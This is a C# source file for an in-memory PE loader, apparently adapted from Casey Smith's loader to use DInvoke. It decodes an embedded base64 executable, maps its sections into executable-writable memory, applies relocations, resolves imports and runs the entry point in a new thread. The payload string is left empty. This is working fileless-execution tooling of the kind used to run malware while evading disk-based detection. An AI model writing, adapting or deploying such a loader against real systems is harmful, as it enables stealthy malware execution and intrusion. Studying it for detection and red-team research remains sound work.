// PELoader for x86 and x64 = x84 ;)

using System;
using System.Runtime.InteropServices;
using static DInvoke.Data.PE;
using System.IO;

void print(object input) { Console.WriteLine(input); }
void exit() { Environment.Exit(0); }


[DllImport("kernel32")]
static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
static extern IntPtr LoadLibrary(string lpFileName);

[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport("kernel32")]
static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr param, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("kernel32")]
static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);


uint MEM_COMMIT = 0x1000;
uint MEM_RESERVE = 0x2000;
uint PAGE_EXECUTE_READWRITE = 0x40;
uint PAGE_READWRITE = 0x04;


IntPtr NULL = IntPtr.Zero;


// x86 or x64 ;)

string PE = "";


byte[] unpacked = Convert.FromBase64String(PE);

IMAGE_DOS_HEADER dosHeader = new();
IMAGE_OPTIONAL_HEADER64 OptionalHeader64 = new();
IMAGE_OPTIONAL_HEADER32 OptionalHeader32 = new();
IMAGE_FILE_HEADER FileHeader = new();
IMAGE_SECTION_HEADER[] ImageSectionHeaders;
bool Is32bitPE = false;

// CaseySmith's PELoader Constructor, but modified to DInvoke
using (MemoryStream stream = new MemoryStream(unpacked, 0, unpacked.Length))
{
    BinaryReader reader = new BinaryReader(stream);
    dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

    // Add 4 bytes to the offset
    stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

    UInt32 ntHeadersSignature = reader.ReadUInt32();
    FileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);

    UInt16 IMAGE_FILE_32BIT_MACHINE = 0x0100;
    bool Is32BitHeader = (IMAGE_FILE_32BIT_MACHINE & FileHeader.Characteristics) == IMAGE_FILE_32BIT_MACHINE;

    if (Is32BitHeader)
    {
        OptionalHeader32 = FromBinaryReader<IMAGE_OPTIONAL_HEADER32>(reader);
        Is32bitPE = true;
    }
    else
    {
        OptionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);
    }

    ImageSectionHeaders = new IMAGE_SECTION_HEADER[FileHeader.NumberOfSections];
    for (int headerNo = 0; headerNo < ImageSectionHeaders.Length; ++headerNo)
    {
        ImageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
    }


    byte[] rawbytes = unpacked;

}
static T FromBinaryReader<T>(BinaryReader reader) // CaseySmith's PELoader FromBinaryReader Method
{
    // Read in a byte array
    byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

    // Pin the managed memory while, copy it out the data, then unpin it
    GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
    T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
    handle.Free();

    return theStructure;
}

if (Is32bitPE)
{
    
    print("[*] Loading 32-bit PE, x86 memory layout will apply");
}
else
{
    print("[*] Loading 64-bit PE, x64 memory layout will apply");
}


uint SizeOfImage = Is32bitPE == true ? OptionalHeader32.SizeOfImage : OptionalHeader64.SizeOfImage;
IntPtr codebase = VirtualAlloc(IntPtr.Zero, SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

// Copy Sections
for (int SectionIndex=0; SectionIndex < FileHeader.NumberOfSections; SectionIndex++)
{
    IntPtr SectionAddress = IntPtr.Add(codebase, (int)ImageSectionHeaders[SectionIndex].VirtualAddress);
    uint SectionSize = ImageSectionHeaders[SectionIndex].SizeOfRawData;
    if (SectionSize != 0)
    {
        IntPtr SectionLocation = VirtualAlloc(SectionAddress, SectionSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(unpacked, (int)ImageSectionHeaders[SectionIndex].PointerToRawData, SectionLocation, (int)SectionSize);
    }
    else continue;
}
print("[*] Mapped Sections"); // if there is any errors its mostly comming from here, its not always DNS, its always Relocations :\



// relocations

var ImageBase = Is32bitPE == true ? OptionalHeader32.ImageBase : OptionalHeader64.ImageBase;
var delta = Is32bitPE == true ? codebase.ToInt32() - (int)ImageBase : codebase.ToInt64() - (long)ImageBase;
var BaseRelocationRVA = Is32bitPE == true ? OptionalHeader32.BaseRelocationTable.VirtualAddress : OptionalHeader64.BaseRelocationTable.VirtualAddress;


IntPtr RelocationTablePtr = IntPtr.Add(codebase, (int)BaseRelocationRVA);
IMAGE_BASE_RELOCATION ImageBaseRelocation = new ();
ImageBaseRelocation = Marshal.PtrToStructure<IMAGE_BASE_RELOCATION>(RelocationTablePtr);
int ImageSizeOfBaseRelocation = Marshal.SizeOf<IMAGE_BASE_RELOCATION>();
int SizeOfRelocationBlock = (int)ImageBaseRelocation.SizeOfBlock;
IntPtr pRelocationTablePtr = RelocationTablePtr; // using a pointer to a pointer ??? --__('')__--

while (true)
{
    IMAGE_BASE_RELOCATION ImageBaseRelocation2 = new();
    IntPtr NextRelocationBlock = IntPtr.Add(RelocationTablePtr, SizeOfRelocationBlock);
    ImageBaseRelocation2 = Marshal.PtrToStructure<IMAGE_BASE_RELOCATION>(NextRelocationBlock);

    IntPtr RelocationBlockAddress = IntPtr.Add(codebase, (int)ImageBaseRelocation.VirtualAdress);
    int RelocationEntriesinBlock = (int)((ImageBaseRelocation.SizeOfBlock - ImageSizeOfBaseRelocation) / 2);
    
    for (int i = 0; i < RelocationEntriesinBlock; i++)
    {
        UInt16 RelocationEntry = (UInt16)Marshal.ReadInt16(pRelocationTablePtr, ImageSizeOfBaseRelocation + (2 * i));
        UInt16 type = (UInt16)(RelocationEntry >> 12);
        UInt16 AddressToFix = (UInt16)(RelocationEntry & 0xfff);
        switch (type)
        {
            case 0x0:
                break;
            case 0xA: // PE32+
                IntPtr PatchAddress = IntPtr.Add(RelocationBlockAddress, AddressToFix);
                long OriginalAddress = Marshal.ReadInt64(PatchAddress);
                Marshal.WriteInt64(PatchAddress, OriginalAddress + delta);
                break;
            
            case 0x3: // PE32
                IntPtr PatchAddress32 = IntPtr.Add(RelocationBlockAddress, AddressToFix);
                int OriginalAddress32 = Marshal.ReadInt32(PatchAddress32);                
                Marshal.WriteInt32(PatchAddress32, OriginalAddress32 + (int)delta);
                break;
        }

    }
    pRelocationTablePtr = IntPtr.Add(RelocationTablePtr, SizeOfRelocationBlock);
    SizeOfRelocationBlock += (int)ImageBaseRelocation2.SizeOfBlock;
    ImageBaseRelocation = ImageBaseRelocation2;

    if (ImageBaseRelocation2.SizeOfBlock == 0) break;
}
print("[*] Performed Relocations");


// Resolving Imports

int IMBORT_DIRECTORY_TABLE_ENTRY_LENGTH = 20;
int IDT_IAT_OFFSET = 16;
int DLL_NAME_RVA_OFFSET = 12;
int IMPORT_LOOKUP_TABLE_HINT = 2;

var IMPORT_TABLE_SIZE = Is32bitPE == true? (int)OptionalHeader32.ImportTable.Size : (long)OptionalHeader64.ImportTable.Size;
int ImportTableRVA = Is32bitPE == true ? (int)OptionalHeader32.ImportTable.VirtualAddress : (int)OptionalHeader64.ImportTable.VirtualAddress;

int SizeOfImportDescriptorStruct = Marshal.SizeOf<DInvoke.Data.Win32.Kernel32.IMAGE_IMPORT_DESCRIPTOR>();
var NumberOfDlls = IMPORT_TABLE_SIZE / SizeOfImportDescriptorStruct;

IntPtr pIDT = IntPtr.Add(codebase, ImportTableRVA);

for (int DllIndex = 0; DllIndex < NumberOfDlls; DllIndex++)
{
    IntPtr pImageImportDescriptor = IntPtr.Add(pIDT, IMBORT_DIRECTORY_TABLE_ENTRY_LENGTH * DllIndex);
    IntPtr dllNameRva = IntPtr.Add(pImageImportDescriptor, DLL_NAME_RVA_OFFSET);
    IntPtr dllNamePtr = IntPtr.Add(codebase, Marshal.ReadInt32(dllNameRva));
    string DllName = Marshal.PtrToStringAnsi(dllNamePtr);

    IntPtr Handle2Dll = LoadLibrary(DllName);
    int IAT_RVA = Marshal.ReadInt32(pImageImportDescriptor, IDT_IAT_OFFSET);
    IntPtr IATPtr = IntPtr.Add(codebase, IAT_RVA);

    while (true)
    {
        IntPtr DllFuncNamePtr = IntPtr.Add(codebase, Marshal.ReadInt32(IATPtr) + IMPORT_LOOKUP_TABLE_HINT);
        string DllFuncName = Marshal.PtrToStringAnsi(DllFuncNamePtr);
        if (string.IsNullOrEmpty(DllFuncName)) break; // sanity check
        //print($"{DllName} _> {DllFuncName}");
        IntPtr FuncAddress = GetProcAddress(Handle2Dll, DllFuncName);
        var IntFunctionAddress = Is32bitPE == true ? FuncAddress.ToInt32() : FuncAddress.ToInt64(); ;
        if (Is32bitPE)
        {
            Marshal.WriteInt32(IATPtr, (int)IntFunctionAddress);

        }
        else
        {
            Marshal.WriteInt64(IATPtr, (long)IntFunctionAddress);
        }

        IATPtr = IntPtr.Add(IATPtr, IntPtr.Size);
    }


}
print("[*] Loaded Dlls and Fixed Import Access Table");

print("[*] Executing loaded PE");

int AddressOfEntryPoint = Is32bitPE == true? (int)OptionalHeader32.AddressOfEntryPoint : (int)OptionalHeader64.AddressOfEntryPoint;

IntPtr threadStart = IntPtr.Add(codebase, AddressOfEntryPoint);
IntPtr hThread = CreateThread(IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, IntPtr.Zero);
WaitForSingleObject(hThread, 0xFFFFFFFF);

